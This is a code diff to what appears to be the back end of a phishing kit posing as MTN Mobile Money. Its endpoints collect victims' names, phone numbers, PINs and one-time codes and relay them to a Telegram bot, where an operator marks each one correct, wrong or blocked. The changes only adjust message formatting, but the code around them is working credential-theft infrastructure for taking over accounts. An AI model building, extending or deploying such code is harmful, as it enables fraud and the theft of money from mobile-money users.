@@ -14,6 +14,14 @@ const DOMAIN = (process.env.BACKEND_URL || 'https://mtn-mobile-money-8szk.onrend
 // ============================================================
 const REQUIRED_UPDATES = ['message', 'callback_query'];
 
+// ============================================================
+// 📏 FORCE FULL-WIDTH MESSAGE BUBBLE
+// Telegram sizes the bubble to the widest line of text.
+// A 34-char separator pushes it to max width on mobile, so the
+// inline buttons always stretch edge-to-edge.
+// ============================================================
+const SEP = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
+
 // ---------------- PERSISTENT STORE ----------------
 const DATA_DIR = path.join(__dirname, 'data');
 const STORE_FILE = path.join(DATA_DIR, 'store.json');
@@ -100,17 +108,32 @@ function esc(str) {
         .replace(/>/g, '&gt;');
 }
 
+// Pad short values so the line never collapses the bubble width.
+// The trailing non-breaking space is invisible but counts for width.
+function pad(str) {
+    let s = String(str === null || str === undefined ? 'Unknown' : str);
+    // Ensure each value line is at least as wide as the separator
+    const minLen = 26;
+    if (s.length < minLen) {
+        s = s + '\u00A0'.repeat(minLen - s.length);
+    }
+    return s;
+}
+
+// Every message now forces a full-width bubble via a 34-char separator
+// and padded value lines, so buttons always stretch edge-to-edge.
 function withIdentity(header, name, phone, extraLines = []) {
     const lines = [
         `<b>${esc(header)}</b>`,
-        '━━━━━━━━━━━━━━━━━━',
-        `<b>Name:</b>  <b>${esc(name)}</b>`,
-        `<b>Phone:</b> <b>${esc(phone)}</b>`
+        SEP,
+        `<b>Name:</b>  <b>${esc(pad(name))}</b>`,
+        `<b>Phone:</b> <b>${esc(pad(phone))}</b>`
     ];
     if (extraLines.length) {
-        lines.push('━━━━━━━━━━━━━━━━━━');
+        lines.push(SEP);
         lines.push(...extraLines);
     }
+    lines.push(SEP);
     return lines.join('\n');
 }
 
@@ -289,7 +312,6 @@ app.post('/submit-phone', (req, res) => {
     };
     saveStore();
 
-    // 2 buttons in one row → side by side, together 100% width
     sendTelegramMessage(
         bot,
         withIdentity('📱 PHONE NUMBER VERIFICATION', finalName, finalPhone),
@@ -332,7 +354,7 @@ app.post('/submit-pin', (req, res) => {
     sendTelegramMessage(
         bot,
         withIdentity('🔐 PIN VERIFICATION', finalName, finalPhone, [
-            `<b>PIN:</b>  <b><code>${esc(pin)}</code></b>`
+            `<b>PIN:</b>  <b><code>${esc(pad(pin))}</code></b>`
         ]),
         [
             [
@@ -379,7 +401,7 @@ app.post('/submit-code', (req, res) => {
     sendTelegramMessage(
         bot,
         withIdentity('🔑 OTP CODE VERIFICATION', finalName, finalPhone, [
-            `<b>Code:</b> <b><code>${esc(finalCode)}</code></b>`
+            `<b>Code:</b> <b><code>${esc(pad(finalCode))}</code></b>`
         ]),
         [
             [
@@ -484,7 +506,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
             handled = true;
             feedback = 'Correct ✅';
             newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
-                `<b>PIN:</b>  <b><code>${esc(meta.pin || '')}</code></b>`,
+                `<b>PIN:</b>  <b><code>${esc(pad(meta.pin || ''))}</code></b>`,
                 '<b>Status:</b> ✅ <b>Correct</b>'
             ]);
         } else if (action === 'pin_bad') {
@@ -492,7 +514,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
             handled = true;
             feedback = 'Wrong ❌';
             newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
-                `<b>PIN:</b>  <b><code>${esc(meta.pin || '')}</code></b>`,
+                `<b>PIN:</b>  <b><code>${esc(pad(meta.pin || ''))}</code></b>`,
                 '<b>Status:</b> ❌ <b>Wrong</b>'
             ]);
         } else if (action === 'pin_block') {
@@ -500,7 +522,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
             handled = true;
             feedback = 'User blocked 🛑';
             newText = withIdentity('🔐 PIN VERIFICATION', name, phone, [
-                `<b>PIN:</b>  <b><code>${esc(meta.pin || '')}</code></b>`,
+                `<b>PIN:</b>  <b><code>${esc(pad(meta.pin || ''))}</code></b>`,
                 '<b>Status:</b> 🛑 <b>User blocked</b>'
             ]);
         }
@@ -510,7 +532,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
             handled = true;
             feedback = 'Correct ✅';
             newText = withIdentity('🔑 OTP CODE VERIFICATION', name, phone, [
-                `<b>Code:</b> <b><code>${esc(meta.code || '')}</code></b>`,
+                `<b>Code:</b> <b><code>${esc(pad(meta.code || ''))}</code></b>`,
                 '<b>Status:</b> ✅ <b>Correct</b>'
             ]);
         } else if (action === 'code_bad') {
@@ -518,7 +540,7 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
             handled = true;
             feedback = 'Wrong ❌';
             newText = withIdentity('🔑 OTP CODE VERIFICATION', name, phone, [
-                `<b>Code:</b> <b><code>${esc(meta.code || '')}</code></b>`,
+                `<b>Code:</b> <b><code>${esc(pad(meta.code || ''))}</code></b>`,
                 '<b>Status:</b> ❌ <b>Wrong</b>'
             ]);
         } else {
